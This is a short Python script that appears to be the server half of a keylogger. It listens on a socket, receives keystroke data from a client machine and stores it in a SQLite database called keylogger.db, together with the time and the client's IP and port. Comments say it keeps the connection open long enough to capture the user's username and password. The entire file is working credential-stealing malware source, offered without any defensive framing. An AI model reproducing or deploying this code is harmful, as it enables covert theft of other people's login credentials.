import socket
import time
import datetime
import sqlite3 #to createe database for keeping records.

#connecting database.
con = sqlite3.connect('keylogger.db')
cur = con.cursor()
cur.execute('''CREATE TABLE IF NOT EXISTS loggedRecords
                (SNo INTEGER PRIMARY KEY AUTOINCREMENT, 
                Datetime TEXT NOT NULL, 
                Client_IP TEXT NOT NULL, 
                Client_Port TEXT NOT NULL,
                Logged_data TEXT NOT NULL)''')

# Server details
HOST = '172.22.76.81'
PORT = 5000

def main():
    # Create a server socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_sock:
        server_sock.bind((HOST, PORT))
        server_sock.listen(5)
        # secure_socket = context.wrap_socket(server_sock,server_side=True)
        print(f"Server listening on {HOST}:{PORT}")

        conn,addr = server_sock.accept()
        date = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(date)
        print(f"Connection established with {addr}")

        # Receive data from the client
        start_time = time.time()
        duration = 45 # a buffer time given to user to enter their login credentials
        with conn:
            while True:
                elapsed_time = time.time() - start_time
                data = conn.recv(1024)
                if not data:
                    break
                # Store or process the received data
                print(data)
                cur.execute('''INSERT INTO 'loggedRecords' ('Datetime','Client_IP','Client_Port','Logged_data') VALUES (?,?,?,?) ''',(date,addr[0],addr[1],str(data)))
                con.commit()
                if elapsed_time > duration:  # to stop connection as soon as we recieve the username and password
                    conn.close()

if __name__ == "__main__":
    main()
